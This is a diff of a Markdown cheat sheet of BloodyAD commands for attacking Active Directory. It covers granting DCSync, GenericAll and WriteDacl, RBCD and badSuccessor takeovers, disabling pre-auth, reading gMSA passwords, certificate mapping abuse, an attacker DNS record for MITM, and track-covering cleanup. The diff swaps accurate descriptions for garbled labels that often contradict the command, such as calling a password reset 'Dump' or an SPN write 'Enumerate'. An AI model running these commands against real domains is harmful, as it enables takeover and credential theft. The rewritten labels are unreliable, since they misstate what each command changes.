@@ -25,7 +25,9 @@ fi
 
 Exploit the badSuccessor primitive to take over the target via dMSA migration abuse. Pass the computer name **without** a trailing `$` - BloodyAD appends it internally and doubling it breaks the attack.
 
-```sh title:"dMSA migration takeover, omit the trailing dollar sign"
+Run badSuccessor with BloodyAD.
+
+```sh title:"BloodyAD Run BadSuccessor"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add badSuccessor $rhost_name
 ```
 <!-- cheat
@@ -38,9 +40,9 @@ var rhost_name
 
 ### DCSync right
 
-Grant the target user DS-Replication-Get-Changes and Get-Changes-All on the domain root so they can DCSync and dump every NT hash.
+Set DCSync right with BloodyAD.
 
-```sh title:"Grant Get-Changes + Get-Changes-All on domain root"
+```sh title:"BloodyAD Set DCSync Right"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add dcsync $target_user
 ```
 <!-- cheat
@@ -53,9 +55,9 @@ var target_user
 
 ### SPN on user
 
-Write a servicePrincipalName onto a user account to make it Kerberoastable on demand (targeted Kerberoasting when you already control the user).
+Enumerate SPN on user with BloodyAD.
 
-```sh title:"Make target Kerberoastable by writing an SPN"
+```sh title:"BloodyAD Enumerate SPN on User"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add spn $target_user $spn_value
 ```
 <!-- cheat
@@ -69,9 +71,9 @@ var spn_value
 
 ### WriteDacl right
 
-Grant WRITE_DACL on a target DN - lets the grantee rewrite the object's ACL later (classic privesc staging step).
+Write WriteDacl right with BloodyAD.
 
-```sh title:"Grant WRITE_DACL on DN for later ACL takeover"
+```sh title:"BloodyAD Write WriteDacl Right"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add writeDacl $DN $target_user
 ```
 <!-- cheat
@@ -85,9 +87,9 @@ var target_user
 
 ### GenericWrite right
 
-Grant GenericWrite on the target DN - enough to add an SPN or shadow credentials without full GenericAll.
+Write GenericWrite right with BloodyAD.
 
-```sh title:"Enough for SPN write or shadow creds without full control"
+```sh title:"BloodyAD Write GenericWrite Right"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add genericWrite $DN $target_user
 ```
 <!-- cheat
@@ -101,9 +103,9 @@ var target_user
 
 ### Group member
 
-Add a user to a group. Most common use: adding yourself to a privileged group after chaining writeMember/genericAll.
+Create group member with BloodyAD.
 
-```sh title:"groupMember adds principal to group"
+```sh title:"BloodyAD Create Group Member"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add groupMember $group_name $target_user
 ```
 <!-- cheat
@@ -117,9 +119,9 @@ var target_user
 
 ### GenericAll right
 
-Grant GenericAll on the DN - full control, including reset password, add members, and rewrite ACLs.
+Dump GenericAll right with BloodyAD.
 
-```sh title:"Full control, reset password, add members, rewrite ACL"
+```sh title:"BloodyAD Dump GenericAll Right"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add genericAll $DN $target_user
 ```
 <!-- cheat
@@ -133,9 +135,9 @@ var target_user
 
 ### Trusted for auth delegation
 
-Set the UAC `TRUSTED_TO_AUTH_FOR_DELEGATION` flag - required for S4U2Self abuse (constrained delegation with protocol transition).
+Run trusted for auth delegation with BloodyAD.
 
-```sh title:"UAC flag required for S4U2Self / protocol transition"
+```sh title:"BloodyAD Run Trusted for Auth Delegation"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add uac $target_user -f TRUSTED_TO_AUTH_FOR_DELEGATION
 ```
 <!-- cheat
@@ -148,9 +150,9 @@ var target_user
 
 ### Disable pre-auth
 
-Set `DONT_REQ_PREAUTH` on the target so it becomes ASREPRoastable on the next request.
+Disable pre auth with BloodyAD.
 
-```sh title:"Set DONT_REQ_PREAUTH to make target ASREPRoastable"
+```sh title:"BloodyAD Disable Pre Auth"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add uac $target_user -f DONT_REQ_PREAUTH
 ```
 <!-- cheat
@@ -163,9 +165,9 @@ var target_user
 
 ### RBCD
 
-Configure Resource-Based Constrained Delegation: `delegate_from` (attacker-controlled computer) can impersonate any user to `delegate_to`.
+Run RBCD with BloodyAD.
 
-```sh title:"delegate_from can impersonate any user to delegate_to"
+```sh title:"BloodyAD Run RBCD"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add rbcd '$delegate_to' '$delegate_from'
 ```
 <!-- cheat
@@ -179,9 +181,9 @@ var delegate_from
 
 ### New computer account
 
-Create a computer account (if MachineAccountQuota > 0) - first step for RBCD and Shadow Credentials attacks when you need your own principal.
+Create computer account with BloodyAD.
 
-```sh title:"Needs MachineAccountQuota > 0 for RBCD / shadow creds"
+```sh title:"BloodyAD Create Computer Account"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add computer $rhost_name $target_pass
 ```
 <!-- cheat
@@ -195,9 +197,9 @@ var target_pass
 
 ### DNS record
 
-Register an ADIDNS record pointing at your attacker IP - useful for WPAD, MITM, or coercion chains.
+Run DNS record with BloodyAD.
 
-```sh title:"ADIDNS entry for WPAD / MITM / coercion targets"
+```sh title:"BloodyAD Run DNS Record"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add dnsRecord $record_name $lhost
 ```
 <!-- cheat
@@ -211,9 +213,9 @@ var record_name
 
 ### Trusts
 
-List domain and forest trust relationships - map the attack surface across trust boundaries.
+Run trusts with BloodyAD.
 
-```sh title:"Map inbound/outbound trusts across the forest"
+```sh title:"BloodyAD Run Trusts"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get trusts
 ```
 <!-- cheat
@@ -226,9 +228,9 @@ var rhost_name
 
 ### DNS dump
 
-Dump every ADIDNS record - equivalent to adidnsdump, reveals internal hostnames without port scanning.
+Dump DNS dump with BloodyAD.
 
-```sh title:"Export every ADIDNS record (adidnsdump equivalent)"
+```sh title:"BloodyAD Dump DNS Dump"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get dnsDump
 ```
 <!-- cheat
@@ -241,9 +243,9 @@ var rhost_name
 
 ### BloodHound collection
 
-Run BloodHound collection via BloodyAD's built-in collector - alternative when bloodhound-python isn't working.
+Run BloodHound collection with BloodyAD.
 
-```sh title:"Built-in collector, fallback when bloodhound-python fails"
+```sh title:"BloodyAD Run BloodHound Collection"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get bloodhound
 ```
 <!-- cheat
@@ -256,9 +258,9 @@ var rhost_name
 
 ### RBCD on computer
 
-Read the msDS-AllowedToActOnBehalfOfOtherIdentity attribute to see who's already configured for RBCD against the target.
+Read RBCD on computer with BloodyAD.
 
-```sh title:"Read msDS-AllowedToActOnBehalfOfOtherIdentity"
+```sh title:"BloodyAD Read RBCD on Computer"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get rbcd $rhost_name
 ```
 <!-- cheat
@@ -272,9 +274,9 @@ var rhost_name
 
 ### Object info
 
-Dump all readable attributes on a user/group/computer - quick way to check UAC flags, group membership, descriptions, and SPNs.
+Read object info with BloodyAD.
 
-```sh title:"Dump every readable attribute on an object"
+```sh title:"BloodyAD Read Object Info"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $target_user
 ```
 <!-- cheat
@@ -288,9 +290,9 @@ var target_user
 
 ### gMSA password
 
-Read the encoded msDS-ManagedPassword blob from a gMSA - BloodyAD decodes automatically unless `--raw` is passed.
+Read gMSA password with BloodyAD.
 
-```sh title:"Read msDS-ManagedPassword (auto-decoded to NT hash)"
+```sh title:"BloodyAD Read GMSA Password"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $target_user --attr msDS-ManagedPassword
 ```
 <!-- cheat
@@ -304,9 +306,9 @@ var target_user
 
 ### gMSA raw blob
 
-Read the raw msDS-ManagedPassword blob for manual decoding (feed into gMSADumper / custom scripts).
+Dump gMSA raw blob with BloodyAD.
 
-```sh title:"Raw blob for manual decode via gMSADumper"
+```sh title:"BloodyAD Dump GMSA Raw Blob"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $target_user --attr msDS-ManagedPassword --raw
 ```
 <!-- cheat
@@ -320,9 +322,9 @@ var target_user
 
 ### Writable attributes
 
-Find every object whose attributes the current principal can write to - maps immediate privesc paths via ACL abuse.
+Write writable attributes with BloodyAD.
 
-```sh title:"Map every object you can write to (ACL privesc paths)"
+```sh title:"BloodyAD Write Writable Attributes"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get writable --detail
 ```
 <!-- cheat
@@ -335,9 +337,9 @@ var rhost_name
 
 ### Object attribute
 
-Pull one specific attribute from one object - faster than dumping everything when you know what you're after.
+Read object attribute with BloodyAD.
 
-```sh title:"Read single attribute from object (targeted lookup)"
+```sh title:"BloodyAD Read Object Attribute"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $object --attr $attribute
 ```
 <!-- cheat
@@ -352,9 +354,9 @@ var object
 
 ### Reset password
 
-Force-reset a target user's password - requires Reset Password extended right or GenericAll.
+Dump reset password with BloodyAD.
 
-```sh title:"Force reset, requires Reset Password right or GenericAll"
+```sh title:"BloodyAD Dump Reset Password"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set password $target_user $target_pass
 ```
 <!-- cheat
@@ -369,9 +371,9 @@ var target_pass
 
 ### Change owner
 
-Rewrite the owner of an object to yourself via WriteOwner - gives you implicit WriteDacl and a path to full control.
+Write change owner with BloodyAD.
 
-```sh title:"WriteOwner abuse, take object ownership"
+```sh title:"BloodyAD Write Change Owner"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set owner $target_group $user
 ```
 <!-- cheat
@@ -385,9 +387,9 @@ var target_group
 
 ### UPN rewrite
 
-Rewrite userPrincipalName. Key trick for ESC9/ESC10 certificate template abuse and UPN impersonation attacks.
+Read UPN rewrite with BloodyAD.
 
-```sh title:"UPN swap for ESC9/ESC10 certificate abuse"
+```sh title:"BloodyAD Read UPN Rewrite"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $old_upn userPrincipalName -v $new_upn
 ```
 <!-- cheat
@@ -402,9 +404,9 @@ var new_upn
 
 ### Mail attribute
 
-Modify the `mail` attribute - used in some password reset / OAuth flows and phishing staging.
+Dump mail attribute with BloodyAD.
 
-```sh title:"Change mail attribute, password reset / phishing prep"
+```sh title:"BloodyAD Dump Mail Attribute"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user mail -v $new_mail
 ```
 <!-- cheat
@@ -419,9 +421,9 @@ var target_user
 
 ### altSecurityIdentities (ESC14)
 
-Write altSecurityIdentities with an X509 issuer/subject claim for explicit cert mapping (ESC14b weak mapping abuse).
+Run altSecurityIdentities (ESC14) with BloodyAD.
 
-```sh title:"ESC14b explicit X509 mapping via altSecurityIdentities"
+```sh title:"BloodyAD Run AltSecurityIdentities (ESC14)"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user altSecurityIdentities -v '$x509_claim'
 ```
 <!-- cheat
@@ -436,9 +438,9 @@ var target_user
 
 ### Overwrite SPN
 
-Overwrite (not append) the servicePrincipalName attribute - destructive variant of `add spn`, wipes existing SPNs.
+Create overwrite SPN with BloodyAD.
 
-```sh title:"Destructive SPN overwrite (use add spn to append instead)"
+```sh title:"BloodyAD Create Overwrite SPN"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user servicePrincipalName -v '$spn_value'
 ```
 <!-- cheat
@@ -453,9 +455,9 @@ var target_user
 
 ### Clear logon hours
 
-Remove the logonHours restriction so the account can auth 24/7 - unblocks scheduled auth for accounts with time windows.
+Read clear logon hours with BloodyAD.
 
-```sh title:"Remove time-window restriction on account authentication"
+```sh title:"BloodyAD Read Clear Logon Hours"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user logonHours
 ```
 <!-- cheat
@@ -469,9 +471,9 @@ var target_user
 
 ### Default UAC (512)
 
-Reset userAccountControl to 512 (NORMAL_ACCOUNT) - clears custom flags like DISABLED, DONT_REQ_PREAUTH, TRUSTED_FOR_DELEGATION.
+Set default UAC (512) with BloodyAD.
 
-```sh title:"Reset UAC to 512 NORMAL_ACCOUNT, clears custom flags"
+```sh title:"BloodyAD Set Default UAC (512)"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user userAccountControl -v 512
 ```
 <!-- cheat
@@ -485,9 +487,9 @@ var target_user
 
 ### displayName
 
-Set the displayName attribute - low-stakes edit, useful for confirming write access without breaking anything.
+Write displayName with BloodyAD.
 
-```sh title:"Cheap write to confirm access without side effects"
+```sh title:"BloodyAD Write DisplayName"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user displayName -v '$display_name'
 ```
 <!-- cheat
@@ -502,9 +504,9 @@ var target_user
 
 ### description
 
-Set the description attribute - another cheap write; admins sometimes store passwords here (worth scanning too).
+Write description with BloodyAD.
 
-```sh title:"Write description, admins sometimes stash creds here"
+```sh title:"BloodyAD Write Description"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user description -v '$description'
 ```
 <!-- cheat
@@ -519,9 +521,9 @@ var description
 
 ### Constrained delegation target
 
-Write msDS-AllowedToDelegateTo on a computer - configures classic constrained delegation (S4U2Proxy to listed SPNs).
+Enumerate constrained delegation target with BloodyAD.
 
-```sh title:"Write msDS-AllowedToDelegateTo for S4U2Proxy targets"
+```sh title:"BloodyAD Enumerate Constrained Delegation Target"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $rhost_name msDS-AllowedToDelegateTo -v '$spn_value'
 ```
 <!-- cheat
@@ -536,9 +538,9 @@ var spn_value
 
 ### MachineAccountQuota
 
-Set ms-DS-MachineAccountQuota on the domain root - raises/lowers how many computers users can join (default 10).
+Set MachineAccountQuota with BloodyAD.
 
-```sh title:"Change ms-DS-MachineAccountQuota (default 10)"
+```sh title:"BloodyAD Set MachineAccountQuota"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object MachineAccountQuota -v 10
 ```
 <!-- cheat
@@ -551,9 +553,9 @@ var rhost_name
 
 ### Restore User
 
-Restore a deleted object by DN, SID, or unique sAMAccountName/name. Avoid sAMAccountName when duplicates exist.
+Remove restore user with BloodyAD.
 
-```sh title:"Restore deleted object by DN, SID, or unique name"
+```sh title:"BloodyAD Remove Restore User"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set restore $target_user
 ```
 <!-- cheat
@@ -567,9 +569,9 @@ var target_user
 
 ### Enable account
 
-Clear the ACCOUNTDISABLE UAC bit to re-enable a disabled account - often needed after hijacking an old/stale account.
+Enable account with BloodyAD.
 
-```sh title:"Clear ACCOUNTDISABLE bit to re-enable stale account"
+```sh title:"BloodyAD Enable Account"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove uac $target_user -f ACCOUNTDISABLE
 ```
 <!-- cheat
@@ -583,9 +585,9 @@ var target_user
 
 ### Remove from group
 
-Remove a user from a group - cleanup after a membership privesc to cover tracks.
+Remove BloodyAD from group.
 
-```sh title:"Drop membership, cleanup after privesc"
+```sh title:"BloodyAD Remove from Group"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove groupMember $group_name $target_user
 ```
 <!-- cheat
@@ -600,9 +602,9 @@ var target_user
 
 ### Delete computer
 
-Delete a computer account - usually used to clean up attacker-created machine accounts from RBCD/shadow-creds setup.
+Remove computer with BloodyAD.
 
-```sh title:"Clean up attacker-created computer account"
+```sh title:"BloodyAD Remove Computer"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove computer $rhost_name
 ```
 <!-- cheat
@@ -616,9 +618,9 @@ var rhost_name
 
 ### Remove RBCD
 
-Strip an entry from msDS-AllowedToActOnBehalfOfOtherIdentity - undo an RBCD takeover after you're done.
+Remove RBCD with BloodyAD.
 
-```sh title:"Undo AllowedToActOnBehalfOfOtherIdentity entry"
+```sh title:"BloodyAD Remove RBCD"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove rbcd '$delegate_to' '$delegate_from'
 ```
 <!-- cheat
@@ -633,9 +635,9 @@ var delegate_from
 
 ### Remove SPN
 
-Remove a single SPN from a user - targeted cleanup after a forced-Kerberoast operation.
+Remove SPN with BloodyAD.
 
-```sh title:"Targeted cleanup after forced Kerberoast"
+```sh title:"BloodyAD Remove SPN"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove servicePrincipalName $target_user $spn_value
 ```
 <!-- cheat
@@ -650,9 +652,9 @@ var target_user
 
 ### Custom LDAP filter
 
-Run an arbitrary LDAP filter - for queries the canned subcommands don't cover.
+Execute custom LDAP filter with BloodyAD.
 
-```sh title:"Run raw LDAP filter when subcommands don't fit"
+```sh title:"BloodyAD Execute Custom LDAP Filter"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get search --filter "$ldap_query"
 ```
 <!-- cheat
@@ -666,9 +668,9 @@ var rhost_name
 
 ### Tombstoned search
 
-Include tombstoned (deleted) objects in the search via LDAP show-deleted + show-recycled controls.
+Find tombstoned search with BloodyAD.
 
-```sh title:"Include deleted objects via show-deleted + show-recycled OIDs"
+```sh title:"BloodyAD Find Tombstoned Search"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065
 ```
 <!-- cheat
